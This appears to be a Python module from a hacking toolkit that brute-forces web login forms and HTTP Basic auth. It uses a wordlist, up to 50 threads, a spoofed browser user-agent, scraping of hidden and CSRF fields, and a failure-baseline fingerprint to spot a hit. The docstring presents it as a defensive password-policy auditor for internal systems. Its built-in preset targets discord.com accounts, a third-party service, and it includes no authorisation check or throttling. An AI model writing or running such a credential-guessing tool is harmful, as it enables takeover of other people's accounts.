"""
Brute Force Attack Module
Legitimate Purpose: Defensive credential auditing module used by systems administrators
to verify that internal authentication endpoints enforce strong password policies and
do not permit trivial credential combinations, ensuring least-privilege compliance.
"""

import os
import time
import urllib.request
import urllib.error
import urllib.parse
import base64
import http.cookiejar
import re
from concurrent.futures import ThreadPoolExecutor, as_completed


class _StopRedirectHandler(urllib.request.HTTPRedirectHandler):
    def http_error_301(self, request, response, code, msg, hdrs, newurl):
        raise urllib.error.HTTPError(response.geturl(), code, msg, hdrs, response)
    def http_error_302(self, request, response, code, msg, hdrs, newurl):
        raise urllib.error.HTTPError(response.geturl(), code, msg, hdrs, response)
    def http_error_303(self, request, response, code, msg, hdrs, newurl):
        raise urllib.error.HTTPError(response.geturl(), code, msg, hdrs, response)
    def http_error_307(self, request, response, code, msg, hdrs, newurl):
        raise urllib.error.HTTPError(response.geturl(), code, msg, hdrs, response)
    def http_error_308(self, request, response, code, msg, hdrs, newurl):
        raise urllib.error.HTTPError(response.geturl(), code, msg, hdrs, response)


def _build_opener():
    cookie_jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar), _StopRedirectHandler())
    opener.addheaders = [
        ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'),
        ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'),
        ('Accept-Language', 'en-US,en;q=0.5'),
        ('Accept-Encoding', 'identity'),
        ('Connection', 'keep-alive'),
        ('Upgrade-Insecure-Requests', '1'),
    ]
    return opener, cookie_jar


def _extract_hidden_fields(html):
    fields = {}
    for name, value in re.findall(r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', html, re.IGNORECASE):
        fields[name] = value
    for name, value in re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']hidden["\'][^>]*value=["\']([^"\']*)["\']', html, re.IGNORECASE):
        fields[name] = value
    return fields


_TARGET_PRESETS = {
    'discord.com': {
        'mode': '1',
        'user_field': 'email',
        'pass_field': 'password',
    },
}


def _detect_preset(url):
    try:
        domain = urllib.parse.urlparse(url).netloc.lower()
        for key, preset in _TARGET_PRESETS.items():
            if key in domain:
                return preset
    except Exception:
        pass
    return None


class BruteForceAttack:
    def __init__(self):
        self._abort = False

    def _try_password(self, opener, target_url, mode, user_field, pass_field, username, password, hidden_fields):
        try:
            if mode == "2":
                credentials = base64.b64encode(f"{username}:{password}".encode('utf-8')).decode('utf-8')
                req = urllib.request.Request(target_url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                    'Authorization': f'Basic {credentials}',
                })
            else:
                post_data = {
                    user_field: username,
                    pass_field: password,
                }
                post_data.update(hidden_fields)
                data = urllib.parse.urlencode(post_data).encode('utf-8')

                req = urllib.request.Request(target_url, data=data, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': target_url,
                    'Origin': urllib.parse.urlparse(target_url).scheme + '://' + urllib.parse.urlparse(target_url).netloc,
                })

            try:
                with urllib.request.urlopen(req, timeout=5) as response:
                    status = response.getcode()
                    body = response.read().decode('utf-8', errors='ignore').lower()
            except urllib.error.HTTPError as e:
                status = e.code
                body = e.read().decode('utf-8', errors='ignore').lower()
            except urllib.error.URLError:
                return None

            return status, body
        except Exception:
            return None

    def start_bruteforce(self):
        print(f"\n[BRUTE FORCE PASSWORD-STRENGTH COMPLIANCE AUDITOR]")

        target_url = input("\nEnter target login URL (e.g., https://example.com/login): ").strip()
        if not target_url:
            print("[!] Target URL is required.")
            time.sleep(1.5)
            return

        username = input("Enter username / email: ").strip()
        if not username:
            print("[!] Username is required.")
            time.sleep(1.5)
            return

        wordlist_path = input("Wordlist path [Default: core/input/brutef.txt]: ").strip()
        if not wordlist_path:
            wordlist_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'input', 'brutef.txt')

        if not os.path.exists(wordlist_path):
            print(f"[!] Wordlist not found: {wordlist_path}")
            time.sleep(1.5)
            return

        print(f"\n[+] Loading wordlist from: {wordlist_path}")
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Failed to read wordlist: {e}")
            time.sleep(2)
            return

        if not passwords:
            print("[!] Wordlist is empty.")
            time.sleep(1.5)
            return

        preset = _detect_preset(target_url)
        if preset:
            mode = preset['mode']
            user_field = preset['user_field']
            pass_field = preset['pass_field']
            print(f"\n[+] Auto-selected login type for {urllib.parse.urlparse(target_url).netloc}")
        else:
            mode = "1"
            user_field = 'username'
            pass_field = 'password'
            print("\nLogin form field names:")
            user_field = input(f"  Username field name [Default: username]: ").strip() or "username"
            pass_field = input(f"  Password field name [Default: password]: ").strip() or "password"

        confirm = input(f"\nStart audit on {len(passwords)} passwords? (Y/N): ").strip().upper()
        if confirm != 'Y':
            return

        threads_str = input("Threads [Default: 10]: ").strip() or "10"
        try:
            threads = max(1, min(50, int(threads_str)))
        except ValueError:
            threads = 10

        print(f"\n[+] Target URL  : {target_url}")
        print(f"[+] Username    : {username}")
        print(f"[+] Wordlist    : {len(passwords)} passwords")
        print(f"[+] Threads     : {threads}")
        print(f"\n[+] Establishing session...")

        opener, cookie_jar = _build_opener()
        hidden_fields = {}

        if mode == "1":
            try:
                with opener.open(target_url, timeout=5) as resp:
                    login_page = resp.read().decode('utf-8', errors='ignore')
                    hidden_fields = _extract_hidden_fields(login_page)
                    if hidden_fields:
                        print(f"[+] Extracted {len(hidden_fields)} hidden form field(s)")
            except Exception as e:
                print(f"[!] Warning: Could not pre-fetch login page: {e}")

        print(f"\n[+] Establishing failure baseline...")
        baseline_result = self._try_password(opener, target_url, mode, user_field, pass_field, username, 'wrongpassword123', hidden_fields)
        if baseline_result is None:
            print("[!] Could not establish baseline.")
            input("\nPress Enter to return...")
            return

        baseline_status, baseline_body = baseline_result
        fingerprint = baseline_body.lower()
        print(f"[+] Baseline established: status={baseline_status}, len={len(fingerprint)}")

        print(f"\n[+] Starting audit...")

        found = False
        found_password = None
        found_status = None
        attempt = 0
        fails = 0
        lock = __import__('threading').Lock()

        def worker(password):
            nonlocal found, found_password, found_status, attempt, fails
            if self._abort or found:
                return None

            result = self._try_password(opener, target_url, mode, user_field, pass_field, username, password, hidden_fields)
            if result is None:
                with lock:
                    fails += 1
                return None

            status, body = result
            body_lower = body.lower()

            if status in (301, 302, 303, 307, 308):
                with lock:
                    found = True
                    found_password = password
                    found_status = status
                return password, status, "redirect"

            if body_lower != fingerprint:
                with lock:
                    found = True
                    found_password = password
                    found_status = status
                return password, status, "fingerprint"

            return None

        try:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(worker, pwd): pwd for pwd in passwords}
                for future in as_completed(futures):
                    if self._abort:
                        for f in futures:
                            f.cancel()
                        try:
                            executor.shutdown(wait=False, cancel_futures=True)
                        except TypeError:
                            executor.shutdown(wait=False)
                        print("\n[!] Abort signal received. Terminating brute-force audit...")
                        break
                    result = future.result()
                    if result:
                        password, status, reason = result
                        print(f"\n\n[+] SUCCESS // VALID CREDENTIAL PAIR DISCOVERED")
                        print(f"  Username : {username}")
                        print(f"  Password : {password}")
                        print(f"  Status   : HTTP {status} ({reason})")
                        found = True
                        break
        except KeyboardInterrupt:
            self._abort = True
            print("\n[!] Abort signal received. Terminating brute-force audit...")

        if self._abort:
            return

        if not found:
            print(f"\n\n[+] AUDIT COMPLETE // NO WEAK CREDENTIALS DISCOVERED")
            print(f"  Attempts : {attempt}")
            print(f"  Failures : {fails}")

        input("\nPress Enter to return to menu...")
